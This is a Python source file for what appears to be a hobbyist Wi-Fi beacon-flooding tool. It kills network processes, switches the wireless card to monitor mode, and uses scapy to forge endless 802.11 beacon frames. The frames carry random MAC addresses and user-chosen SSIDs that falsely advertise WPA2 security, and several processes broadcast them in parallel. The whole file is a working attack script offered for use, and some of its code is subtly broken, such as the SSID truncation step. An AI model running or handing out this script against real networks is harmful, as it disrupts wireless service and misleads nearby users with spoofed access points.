from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, hexdump, RandMAC
import time, os, sys, multiprocessing
from colorama import Fore

R = Fore.LIGHTRED_EX
W = Fore.WHITE

os.system("sudo airmon-ng check kill && sudo airmon-ng start wlan0 && clear")
print(R+'''             
   _____     _       _               _   
  |  |  |___| |_ ___| |_ ___ ___ ___| |_   '''+W+'''Type '''+R+'''HELP'''+W+''' for Command List'''+R+'''!
  |  |  |   | . | -_| '_| .'|   |   |  _|  '''+W+'''Version '''+R+'''6.0
  |_____|_|_|___|___|_,_|__,|_|_|_|_|_|    '''+W+'''Coded by '''+R+'''@i_am_unbekannt

		''')

class CreateBeacon:
  def __init__(self, ssid, number):

    self.ssid = ssid
    self.number = number
    self.addr = RandMAC()
    self.iface = 'wlan0mon'

    self.dot11 = Dot11(type=0, subtype=8, 
    addr1='ff:ff:ff:ff:ff:ff', 
    addr2 = self.addr,
    addr3 = self.addr)

    self.beacon = Dot11Beacon(cap='ESS+privacy')

    self.essid = Dot11Elt(ID='SSID', info=self.ssid, len=len(self.ssid))
    self.rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'
    '\x00\x0f\xac\x02'
    '\x02\x00'
    '\x00\x0f\xac\x04'
    '\x00\x0f\xac\x02'
    '\x01\x00'
    '\x00\x0f\xac\x02'
    '\x00\x00'))

    self.frame = RadioTap()/self.dot11/self.beacon/self.essid/self.rsn
  def Send(self):
    sendp(self.frame, inter=0.050, iface=self.iface, loop=1)

#class SendBeacon:
#  def __init__(self, frame):
#    self.frame = frame
#  def Send(self):
#     sendp(self.frame, inter=0.050, iface=self.iface, loop=1)

class MultiProcessBeacon:
  def __init__(self, ssid, number):
    self.ssid = ssid
    self.number = number

  def MultiProcessSend(self):
    for i in range(self.number):
      Beacon = CreateBeacon(ssid=self.ssid[i], number=self.number)
      i += 1
      str(i)
      # i = multiprocessing.Process(target=SendBeacon.Send, args=Beacon.frame)
      for _ in range(3):
        try:
          i = multiprocessing.Process(target=Beacon.Send)
          i.start()
        except KeyboardInterrupt:
          print(R+'[*]'+W+' processes stopped!')
          time.sleep(1)

class InputMain():
  def __init__(self):

    input_number = input(R+"[*]"+W+" number of SSID's > ")#int(4)
    try:
      int(input_number)
      if int(input_number) == 0:
        print(R+'[*]'+W+' ERROR: exiting...')
        time.sleep(1)
        sys.exit()
    except ValueError:
      print(R+"[*] "+W+"valueError detected; number of SSID's "+R+">>"+W+" 1")
      time.sleep(1)
      input_number = int(1)
    
    input_ssid = []
    for n in range(int(input_number)):
      n += 1 
      ask_ssid = input(R+'[*] '+W+'set name for SSID number ' + str(n)+' >> ')

      if len(ask_ssid) > 32:
        print(R+'[*] '+W+'maximum length of SSID exceeded')
        ask_ssid = ask_ssid[32]
      input_ssid.append(ask_ssid)

    tuple(input_ssid)
    
    self.given_number = int(input_number)
    self.given_ssid = input_ssid
    passInfo_toMulti = MultiProcessBeacon(ssid=self.given_ssid, number=self.given_number)
    passInfo_toMulti.MultiProcessSend()

start = InputMain()